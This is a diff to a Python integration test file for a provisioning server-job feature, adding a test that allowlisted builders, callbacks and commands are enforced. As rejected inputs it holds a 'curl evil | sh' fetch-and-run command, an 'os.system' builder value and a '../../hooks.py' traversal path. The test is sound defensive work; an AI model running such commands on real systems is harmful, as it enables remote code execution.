@@ -65,6 +65,38 @@ class TestServerJob(IntegrationTestCase):
         self.assertIn("Apply the cluster plan", names)
         self.assertEqual(names[-1], "Wait for the listeners")
 
+    def test_jobs_run_only_known_code(self) -> None:
+        # The row is operator-writable: builders, callbacks and commands come from allowlists.
+        self.assertRaisesRegex(
+            frappe.ValidationError,
+            "not a known variables builder",
+            create_server_job,
+            self.node,
+            "run-commands.yml",
+            "x",
+            variables_builder="os.system",
+        )
+        self.assertRaisesRegex(
+            frappe.ValidationError,
+            "not a known callback",
+            create_server_job,
+            self.node,
+            "run-commands.yml",
+            "x",
+            callback="delete",
+        )
+        with patch("suite_cloud.provisioning.ansible.ansible_runner.run", fake_runner([])):
+            job = create_server_job(
+                self.node,
+                "run-commands.yml",
+                title="x",
+                context={"commands": ["curl evil | sh"]},
+                variables_builder="suite_cloud.cloud_mail.cluster.bootstrap.build_command_variables",
+            )
+        job.reload()
+        self.assertEqual(job.status, "Failed")
+        self.assertIn("not one a Server Job may run", job.error_log)
+
     def test_unknown_playbook_is_rejected(self) -> None:
         self.assertRaisesRegex(
             frappe.ValidationError, "does not exist", create_server_job, self.node, "../../hooks.py", "x"
@@ -80,7 +112,7 @@ class TestServerJob(IntegrationTestCase):
                 self.node,
                 "run-commands.yml",
                 title="Run",
-                context={"commands": ["echo hi"]},
+                context={"commands": ["ufw allow 2525/tcp"]},  # the one shape a command job may run
                 variables_builder="suite_cloud.cloud_mail.cluster.bootstrap.build_command_variables",
                 callback="after_provision",
             )
